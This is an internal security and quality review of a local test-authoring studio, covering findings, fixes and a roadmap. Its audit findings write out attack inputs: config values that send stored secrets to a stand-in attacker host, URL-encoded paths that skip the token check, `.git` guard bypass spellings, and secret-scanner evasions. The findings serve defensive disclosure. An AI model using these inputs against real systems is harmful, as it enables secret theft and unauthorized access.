# CS Test Studio: 360° review (2026-11-19)

**Scope:** everything built so far:
- Git and the secret gate
- Secrets and environments
- ADO pipeline secrets
- The UI shell
- History, branches and stash
- The three-pane merge
- The in-house editor and language features
- The test runner

**Method.** Four independent passes. Every finding below was reproduced with a script unless it is marked *reasoned*. Reproduction scripts are in the session scratchpad (`review-sec/`, `review-git/`, `review-ed/`).

| Pass | Approach | Result |
|---|---|---|
| Security | Adversarial review; live attacks against a running Studio | 1 Critical, 3 High, 4 Medium, 8 Low |
| Git correctness | Real throwaway repos covering about 40 repository states | 18 confirmed bugs, 12 likely |
| Editor, language services, environments, runner, scanner | Playwright against a live Studio; comparison with the real framework's `CSConfigurationManager` and `@cucumber/gherkin` | 21 confirmed, 7 likely |
| Day-in-the-life (mine) | Start-up, collisions, and performance on the 927-file framework repo; real framework 1.54.0 runs | 8 findings |

## Verdict
- **The design holds up.** The core flows work end to end against the real framework 1.54.0: commit gate, merge, run, report, secrets and environment parity. 96 automated tests passed at review time (151 after the fix round, below).
- **It is not ready for a team pilot yet.**
  - One critical security hole was found. It is **already fixed and re-verified**.
  - Several data-loss bugs remain in the editor: CRLF files, the close-tab dialog, and switching tabs.
  - The secret scanner can be bypassed (`.gitattributes`, merge commits, names with spaces).
  - The Windows-specific paths are untested.
- **Estimate:** about 2 weeks of hardening, then a pilot on Windows.

## Fix round: status (every item below re-tested)
All findings in §2 and §3 have been worked through.

**Test status after the fix round**
- 151 automated tests pass, up from 96. New suites: `git-fixes`, `paths`, plus regression tests added to every existing suite.
- Browser suites (Playwright, real UI) pass: Git, merge and secrets (`drive.js`), advanced Git (`drive2.js`), editor (`drive3.js`), and runs against the real framework 1.54.0 (`drive4.js`).
- Live checks against a running Studio:
  - encoded API paths: 401;
  - `../` paths: refused;
  - `.GIT/config`: refused;
  - `core.fsmonitor` program: not run.

**Not verified:** the Windows-only items. These are DPAPI batching, absolute `git.exe` / `powershell.exe` / `taskkill.exe` paths, and Windows file-name rules on a real Windows file system. They are implemented and unit-tested on Linux only, so a Windows test pass is still needed.

### Security
| # | Status | What changed |
|---|---|---|
| H1 | Fixed | ADO calls are https-only, to dev.azure.com, `*.visualstudio.com`, or hosts the user adds in **Settings**. The token comes only from the user's own secret (default `ADO_PAT`), never from repository config. Sending secrets requires confirming the exact host (`confirmHost`); the dialog names it. |
| H2 | Fixed | Always uses the Studio's bundled TypeScript. It now also runs in a **worker thread**, so it never blocks the server. |
| H3 | Fixed (*verify on Windows*) | `git` is resolved from absolute PATH entries only, with `CS_STUDIO_GIT` as an override. `powershell.exe` and `taskkill.exe` come from `%SystemRoot%\System32`. |
| M1 | Fixed | Resolved values containing a secret, and their whole reference chain, are masked. Interpolation copies the framework's `handleComplexVariable` (276 keys, 0 mismatches). |
| M2 | Fixed | Diffs use `--text --no-textconv`. Merge commits use `--remerge-diff`. Long lines are scanned in overlapping windows, and the known-secret match runs on the full line. Very large files now block with a "too large to scan" finding instead of failing. |
| M3 | Fixed | New `core/safePath.ts` applies to every write: the editor, `.env` edits, fixes, the allowlist and `.gitignore`. Paths are checked with realpath against the repository, symlink targets are refused, and temp files get random names with `wx`. |
| M4 | Fixed (*verify on Windows*) | Decrypted values are cached in memory, and DPAPI decrypts in one batched PowerShell call. |
| L1 | Fixed | `.git` is refused in any spelling (`.GIT`, `.git.`, `GIT~1`, `::$INDEX_ALLOCATION`), along with reserved device names, `:` and trailing dots or spaces. |
| L3 | Fixed | Names and errors in run history are masked, including URL-encoded and base64 forms. |
| L4 | Fixed | Fingerprints are an HMAC with a per-user key. The allowlist stores a salted scrypt hash (v2; v1 entries still honoured). Stored secrets cannot be allowlisted. `scan --json` omits fingerprints. |
| Others | Fixed | - The report route checks realpaths.<br>- Refs are validated, with `--end-of-options`.<br>- Step patterns that would backtrack badly are only tried on short steps.<br>- Run output and Git stderr have memory caps.<br>- The request body limit is now 12 MB.<br>- Reserved secret names (`PATH`, `NODE_*`, …) are refused.<br>- A repository whose `.git/config` runs programs (filters, textconv, sshCommand, hooksPath, …) is listed at start-up and needs a one-time confirmation. `core.fsmonitor` is always disabled. |

### Editor (E1–E4 and §3)
All 14 items are fixed and each was checked in Chromium:
- three-button close dialog;
- `save()` reports success, so close and run go ahead only after a real save;
- CRLF files stay CRLF;
- one editor per tab, so undo and scroll survive switching tabs;
- undoable Format and Replace All;
- Find/Replace fixes;
- IME input;
- popup placement;
- macOS shortcuts;
- wide characters;
- incremental highlighting (the editor adds 2–8 ms per keystroke on 20k lines);
- doc-string delimiters;
- recreate a deleted file;
- a "TypeScript is starting…" hint.

### Git (G1–G9 and §3)
All fixed. Highlights:
- hunk staging by **change id**: the server refuses a change that was modified since you looked at it;
- byte-exact patches;
- renames;
- `--no-track` on new branches, and an explicit upstream on push;
- modify/delete conflicts;
- best-effort snapshot before a hard reset;
- rebase / `git am` labels ("Current" = the branch you rebase onto, "Incoming" = your commit);
- husky / `core.hooksPath` refusal;
- `core.commentChar`;
- tags of tags;
- an empty cherry-pick or revert is skipped and explained;
- an **upstream deleted** badge;
- an `index.lock` prompt offering to remove a stale lock.

### Runner, environments, scanner, Gherkin, TypeScript
- **Runner:**
  - UTF-8-safe streaming with a final flush and a ring buffer;
  - finds results in multi-project folders and custom report folders;
  - stops runs on shutdown;
  - warns when "Run this scenario" would also run scenarios with overlapping names. The framework matches `--scenario` / `--scenarios` by substring (CSBDDRunner.ts:981, :999).
- **Environments:**
  - OS variables are passed through;
  - `||` semantics match the framework;
  - multi-line values are safe when copying or removing a key;
  - a project file can override a shared environment, and copying works from `common`.
- **Scanner:**
  - selector false positives, `pin` inside words, and short stored values are fixed;
  - camelCase fields are detected;
  - the exact column of the value is reported.
- **Gherkin:**
  - steps are indexed the way the framework loads them: `STEP_DEFINITIONS_PATH` per project, the file-name rules of `CSBDDEngine.isStepFile`, and built-in steps from `dist/steps`;
  - a step defined in a folder the framework does not load is now explained ("defined in X, but that folder is not loaded");
  - doc strings, descriptions, every Examples row, `\|` cells and exact columns are handled;
  - commented-out definitions are ignored.
- **TypeScript:**
  - nearest tsconfig and project references;
  - JavaScript files work;
  - each provider is isolated, so one error doesn't hide the others;
  - project-level errors (e.g. TS5011) show on `tsconfig.json`;
  - warm-up runs when the Code page opens.

### Start-up and everyday
- A friendly message when the folder is not a Git repository.
- A fixed port that falls back to the next free one.
- The link (token) is remembered across restarts (`--new-token` replaces it).
- The browser opens automatically (`--no-open` skips it).
- **A Settings page:**
  - Git name and email;
  - Azure DevOps token secret and on-premises hosts;
  - open browser;
  - port.
- An "Add to .gitignore" offer for `.flaky-test-data/` and report folders.
- "Deleted outside the editor" is told apart from "changed".

## 1. Fixed during this review
| # | Issue | Status |
|---|---|---|
| C1 | **API token check bypassed by URL encoding.** `/%61pi/secrets` and `/api%2F…` were served without the token, because the check read the raw URL while the router decodes it. Any local process could read and write files, start runs, and read secrets. | **Fixed** (`server.ts` checks the matched route and the decoded path). Regression test added; verified live: all variants now return 401. |

## 2. Must fix before anyone uses it (P0)
**Security / secrets**
| # | Problem | Fix |
|---|---|---|
| H1 | The repo's config decides where the ADO PAT and secrets are sent. Setting `ADO_ORGANIZATION_URL=http://attacker` plus `ADO_PAT={env:ANY_SECRET}` exfiltrates any stored secret. | Accept only `https:` hosts on an allowlist (dev.azure.com, *.visualstudio.com, plus hosts the user confirms in personal settings). Use only the secret named by the user. Confirm the destination before sync. |
| H2 | Opening a .ts file runs `node_modules/typescript` from the repo inside the Studio, the process that holds the secret store. | Use the bundled TypeScript by default. The project's copy only after an explicit, remembered "trust this workspace" choice. |
| H3 | Windows looks in the repo folder first for `git.exe`, `powershell.exe` and `taskkill` (*reasoned; verify on Windows*). | Resolve absolute paths once at start-up (`%SystemRoot%\System32\…`, PATH without the cwd). |
| M1 | Stored secrets can be read back through `/api/env/resolve` using indirect references (`B={A}`, `${QA_PASSWORD}`, `{lower:A}`). | After interpolation, mask any value that contains any secret value; mask the whole dependency chain. |
| M2 | The secret scan can be bypassed by `.gitattributes` (`*.json -diff`), by long lines (> 20k characters), and by secrets added while resolving a merge (`diff --cc` is not parsed). | Use `--text --no-textconv`, scan in overlapping windows, use `--remerge-diff` for merge commits, and always run the known-secret match on the full content. |
| M3 | File writes and deletes follow symlinks out of the repo; the save temp name is predictable. | Check `realpath` against the repo root, refuse symlink targets, use random temp names with `wx`. |
| M4 | **Windows:** every editor check, activity entry and environment view decrypts all secrets, one PowerShell launch each. With 10 secrets that is seconds per pause in typing, and it blocks the server. | Decrypt once per session and cache in memory (invalidate on change); batch DPAPI calls into one PowerShell call. |
| L3 | Scenario error text (which can include secret values) is stored unmasked in run history (`.git/cs-studio/runs.json`). | Apply the log masking to summaries before storing. |

**Data loss in the editor**
| # | Problem | Fix |
|---|---|---|
| E1 | Esc or × on "Save changes?" **discards the edits** (confirmed in code). | Three-button dialog; close only on an explicit "Don't save". |
| E2 | "Save" on close closes the tab even when the save failed (conflict or network). | `save()` returns success; close only then. |
| E3 | **CRLF files are silently converted to LF** on the first edit (a textarea always uses LF; confirmed). Until then, line math is wrong, so Tab on a selection deletes a newline. | Normalise to LF in the editor, remember the file's EOL, restore it on save. |
| E4 | Undo history is lost when switching tabs; Format cannot be undone. | Keep one editor per open tab; apply formatting through the undoable insert path. |
| ENV1 | "New environment from copy" copies multi-line private-key bodies; removing a multi-line key corrupts the file; `removeKey` does not validate the key name. | Rebuild from the dotenv parse; validate and escape. |

**Git correctness that users hit daily**
| # | Problem | Fix |
|---|---|---|
| G1 | File names with spaces lose file rules in the secret scanner (git adds a trailing TAB on `+++` lines). | Strip it; take names from `--name-only -z`. |
| G2 | `diff.mnemonicPrefix` / `diff.noprefix` in the user's git config break the scanner and hunk staging. | Always pass `--src-prefix=a/ --dst-prefix=b/`. |
| G3 | Hunk staging corrupts non-UTF-8 files (Latin-1 `.properties` and CSV test data). | Pass patches as raw bytes. |
| G4 | Hunk staging stages *the hunk now at index N*, not the one the user reviewed. | Send the hunk header and hash; refuse if it changed. |
| G5 | A branch created from `origin/main` under another name cannot be pushed (auto-tracking plus `push.default=simple`). **Daily workflow.** | `--no-track` on create; push explicitly with `HEAD:refs/heads/<branch> -u`. |
| G6 | Keep current / take incoming fails for modify/delete conflicts. | Handle missing stages with `git rm`. |
| G7 | Hard reset fails during a conflicted merge (the usual way out). | Make the uncommitted snapshot best-effort. |
| G8 | A rebase started from the command line swaps ours and theirs, so "Mine" drops the user's own change. | When `op==='rebase'`, swap the labels and choices and say "rebasing X onto Y". |
| G9 | Hooks are written into tracked files when `core.hooksPath` points into the repo (husky). | Refuse and explain, or chain without touching tracked files. |

## 3. Should fix (P1)
**Runner**
- UTF-8 characters split between output chunks turn into garbage, and the last line can be lost (use `StringDecoder`; flush on close).
- After 50k lines the end-of-run line is lost (ring buffer).
- Results are not found in multi-project / `MULTI_PROJECT_MODE` folders or with a custom `REPORT_PATH`.
- A previous run's report can be picked up (2-second slack).
- "Run this scenario" can run other scenarios, because the framework matches names as substrings.
- **Stopping the Studio leaves a test run going** (the child runs in its own process group): kill the tracked runs on shutdown.

**Environments.** The values shown differ from the framework's in these cases:
- `{env:HOME}` and OS variables used through `${X:-default}`: the Studio only passes OS variables whose names are also file keys.
- `||` vs `??` for empty values.
- `{context:}`, `{ternary:}` and `<field>`.

Fix: pass the full (masked) environment and copy the framework's `handleComplexVariable` exactly.

**Scanner accuracy**
- False positives:
  - selectors (`password: '#password'`, `data-testid=…`);
  - "pin" inside words (`Shipping`, `Spinner`);
  - short stored secrets (`admin`) flagged everywhere.
- False negatives: camelCase fields (`adminPassword:`, `apiToken:`).
- The "Fix" for `https://admin:admin@host` replaces the username instead of the password (use regex `d`-flag indices).

**Gherkin checks**
- A doc string opened with `"""` is closed by a line starting with ` ``` `.
- Description lines starting with `Given` are treated as steps.
- A second Examples table overwrites the first.
- The column is wrong when the keyword is followed by more than one space.
- Commented-out step definitions are counted.
- Compiled `.js` copies next to the `.ts` source cause "ambiguous" warnings.
- The index is wider than what the framework loads (`STEP_DEFINITIONS_PATH` plus `*.steps.ts` / `*Steps.ts`).

**TypeScript service**
- Solution-style tsconfig (`references`) breaks path aliases.
- A `.js` file without `allowJs` makes the whole check fail, which also drops the secret warnings.
- Project-level config errors such as TS5011 are not shown (the real framework failed on one).
- The first check takes about 10 seconds with no indicator (warm up at launch; show "TypeScript starting…").

**Editor**
- Find & Replace: a single replace works on stale positions; "next" skips a match at the caret; regex `^`/`$` need the `m` flag; `$1` is ignored in Replace All.
- IME composition (CJK input): Enter breaks it.
- The completion popup is clipped near the bottom and right edges.
- On macOS `Shift+Alt+F` does nothing (use `e.code`).
- Squiggles are misaligned on CJK/emoji text.
- About 100 ms per keystroke on a 20k-line file (re-tokenise only the changed lines).

**Git (other)**
- Local branches named `feature/x` are shown as remote in History.
- Graph lanes grow without limit in filtered views.
- Staged renames break hunk views and commit diffs.
- Names with non-ASCII characters can't be deleted or merged (`assertRev` is too strict).
- A conflict marker size other than the default is not recognised.
- `core.commentChar` is ignored in merge messages.
- A tag of a tag shows the wrong commit.
- Untracked files in a stash are listed with quoted names.
- A `.pem` key in LFS is not detected.
- A file over 64 MB makes commit fail instead of warning.
- An empty revert continue reports ok while the revert is still in progress.
- An "upstream gone" state is not shown.
- `git am` is detected as a rebase.
- Cherry-picking a merge commit gives a raw error.

**Start-up and everyday collisions (mine)**
- Starting outside a Git repo shows a raw error, with no "clone or create" option.
- A port in use gives a raw `EADDRINUSE`.
- The browser is not opened automatically, and the link (token) changes on every launch.
- **A message points to "Settings → Git identity", but there is no Settings screen.**
- `index.lock` ("another Git program is running") and fetch errors are not translated into plain words.
- Saving after the file was deleted on disk says "changed", and "Load the other version" then fails.
- The framework writes `.flaky-test-data/` into the project root (suggest adding it to `.gitignore`).

**Smaller security items:**
- `.git` guard bypasses on Windows and macOS (case, trailing dot, `GIT~1`, `::$INDEX_ALLOCATION`).
- The report route trusts the stored `reportDir`.
- Unsalted secret fingerprints appear in API responses and the committed allowlist (use an HMAC).
- `createBranch`/`switchBranch` don't validate refs.
- A step pattern with many `{word}` placeholders can stall the server (regex backtracking).
- Memory caps on run output and git stderr.
- **2–5 MB files cannot be saved** (2 MB body limit vs the 5 MB editor limit).
- Secret names like `PATH` or `NODE_OPTIONS` override the test process environment.
- First-open trust prompt for repos copied with a `.git/config`.

## 4. What was verified to work (highlights)
- **Security:**
  - The Host check blocks DNS rebinding, and the Origin check blocks cross-site writes.
  - No CORS; a 256-bit token compared in constant time.
  - Git runs without a shell, with `--` and literal pathspecs.
  - Secret store: AES-256-GCM, key file 0600 in a 0700 directory, atomic writes; DPAPI receives data on stdin.
  - The UI uses React escaping and a strict CSP.
  - The commit override is bound to the exact findings reviewed.
- **Git:**
  - Every operation behaves sensibly on an empty repo.
  - Names with spaces, quotes, newlines, unicode or a leading dash work in status, stage and diff.
  - Renames, case-only renames, binary files, CRLF and no-EOL hunks are handled.
  - Merge, diff3 and zdiff3 conflicts parse and round-trip correctly (41 files).
  - Linked worktrees and stash with untracked files work.
  - Push scanning works on a branch with no upstream.
- **Environments:** dotenv parsing (BOM, CRLF, `export`, multi-line), comment-preserving edits, cycle guard; matched the framework on all 1,167 comparable keys of the real config.
- **Runner** (against the real framework 1.54.0):
  - Secrets reach the test, and the result is judged from the report even though the framework exits 0 when a scenario fails.
  - Stop leaves no stray processes.
  - The HTML report renders under the Studio's CSP.
- **Steps:** matching mirrors the framework's `patternToRegex`; built-in steps are read from the installed package.
- **Speed (927-file repo):** file list, status, history, environment, search and step index each take 10–80 ms; TypeScript completion about 27 ms.

## 5. Day-to-day QA engineer workflow: coverage today
| Daily task | Studio today | Gap / improvement |
|---|---|---|
| Start the day: open, pull, see what changed | ✅ Pull/Fetch, History graph | Auto-open browser; stable link; "what changed since yesterday" view |
| Check last night's ADO pipeline results | ✅ **Pipelines (ADO)** (done, built for large organizations): choose the ADO project; search pipelines by name or folder; filter runs (branch, result, started by me) with paging; a stage strip for build-and-deploy pipelines (approvals waiting, retried and skipped stages); test results **per stage** from the framework's report artifacts (attributed to the job/stage that published them; only small likely artifacts are opened automatically, any other on request) and from **test runs published to Azure DevOps**; long logs read from the end; throttling (429) waited out; artifact cache kept within limits. Real-data checks: runs, filters, timeline, logs, artifact reports. Checked against simulated data only: multi-stage, approvals, published test runs, throttling. | Link to the failing commit; compare two runs; classic release pipelines |
| Pick a work item / bug | ✅ **Work items (ADO)** (done, read-only): my work, current sprint, search; details as plain text; test case steps; linked items; test cases show whether a scenario in the repo is tagged `@TestCaseId`, and can be copied as a scenario; create a branch from an item (`feature/<id>-…`). Checked against a real Azure DevOps organization. | Link commits and pull requests to the item; update the item's state |
| Write and maintain features and steps | ✅ Editor, step completion, undefined-step check, go to definition, **"Create step definition" quick fix** (done: framework-style method with typed parameters, put in a step file the framework loads; checked by a real framework run) | Rename a step everywhere it is used; find usages of a step; Gherkin formatter (table alignment) |
| Page objects and locators | ❌ | Locator picker from a live browser; locator health check (the framework has `cs-playwright-locator-lint`); page-object templates in the framework style |
| Test data | ❌ | UI over CSDataProvider sources (Excel/CSV/JSON/DB/API): preview rows with filters, edit JSON/CSV, validate the `Examples: {json}` source |
| Run and debug locally | ✅ Run feature/scenario/tags, live output, results, report, rerun failed, **inline failure evidence** (done: failed step + error, failure screenshot, traces per attempt with "Open trace" in the project's Playwright Trace Viewer, videos and console logs; the framework report's own screenshot/trace links now work inside the Studio) | "Run with browser visible, pause on failure"; step-by-step timeline |
| Flaky tests | ❌ (the framework has a FlakyDetector) | Surface flaky and quarantined scenarios and their history; one-click retry policy |
| Commit and push safely | ✅ Secret gate, three-pane merge, hunk staging, stash, amend | Commit message templates with work-item IDs; line-level staging |
| Pull request and review | ❌ | **Create PR in ADO** (title from commits, link work items, reviewers); see PR comments and status checks |
| Run in the pipeline | ✅ Partial: secrets readiness; **start a run on a branch** (asks first; tested against a stand-in, not started for real) | Template parameters in the UI (`targetEnv`, tags); follow a run live |
| Environments and secrets | ✅ Effective values, problems, edit, compare, secret store, ADO secrets | Settings screen; per-environment "test connection" (BASE_URL / DB reachability) |
| AI help | ❌ (planned next) | Copilot chat and agent across editor, failures, Git, ADO; generate steps from undefined steps; explain failures from trace and logs |
| Performance tests | ❌ (perf app not yet folded in) | Bring the perf app's engines in as a "Performance" area |
| Report validation (PDF engine) | ❌ (designed, not built) | Build the in-house PDF engine per `docs/pdf-engine/DESIGN.md` |

## 6. Recommended order
1. **Hardening sprint (about 2 weeks):** all of §2 (P0); the start-up/Settings items; Windows test pass (DPAPI, hooks, taskkill, paths, CRLF).
2. **Daily-workflow wins (about 2 weeks):**
   - "Create step definition" quick fix.
   - Failure evidence inline (screenshot, video, trace).
   - Run-target settings.
   - The §3 runner and environment parity items.
3. **ADO loop (about 3 weeks):** work items, then branch, PR, pipeline run and results, in-Studio.
4. **Copilot panel**, on top of a stable editor and runner (so its edits go through the same undoable, CRLF-safe path).
5. Test data UI, locator tools, flaky-test view, then the perf and PDF engines.
